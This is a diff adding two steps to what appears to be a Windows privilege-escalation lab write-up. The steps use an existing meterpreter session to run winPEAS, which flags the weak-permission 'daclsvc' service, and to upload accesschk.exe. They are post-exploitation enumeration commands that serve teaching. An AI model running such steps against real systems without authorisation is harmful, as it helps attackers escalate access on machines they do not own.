@@ -250,3 +250,31 @@ meterpreter > upload /home/kali/Desktop/tools/winPEASany.exe
 <p align="center">
   <img src="/writeups/Windows-Privilege-Escalation/insecure service configuration/images/step6-2.png" width="600">
 </p>
+
+## Step 7 — Running winPEAS to Find Privilege Escalation Paths
+
+```bash
+meterpreter > shell
+```
+```cmd
+C:\PrivEsc> .\winPEASany.exe
+```
+winPEAS ran a full scan of the machine and flagged the `daclsvc` service as having weak permissions. That was my target.
+
+## Step 8 — Verifying Service Permissions with accesschk.exe
+
+Uploaded `accesschk.exe`
+
+```bash
+meterpreter > upload /home/kali/Desktop/tools/accesschk.exe
+```
+
+```text
+[*] Uploading  : /home/kali/Desktop/tools/accesschk.exe -> accesschk.exe
+[*] Uploaded 217.38 KiB of 217.38 KiB (100.0%): /home/kali/Desktop/tools/accesschk.exe -> accesschk.exe
+[*] Completed  : /home/kali/Desktop/tools/accesschk.exe -> accesschk.exe
+```
+
+<p align="center">
+  <img src="/writeups/Windows-Privilege-Escalation/insecure service configuration/images/step8-1.png" width="600">
+</p>
